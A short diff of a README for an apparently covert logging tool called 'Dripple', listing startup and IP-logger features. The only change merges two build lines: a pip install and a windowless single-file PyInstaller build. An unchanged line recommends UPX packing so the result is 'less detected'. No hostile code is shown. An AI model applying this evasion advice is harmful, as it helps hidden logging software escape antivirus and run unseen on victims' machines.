@@ -21,9 +21,7 @@ Sort of Fast
 Startup
 IP Logger
 Setup: Setup is really simple, it's like any other logger.
-**pip install -r requirements.txt**
-
-**pyinstaller --onefile -w Dripple.py**
+**pip install -r requirements.txt** **pyinstaller --onefile -w Dripple.py**
 
 virtualenv and UPX are recommended to make it smaller, faster, and less detected
 
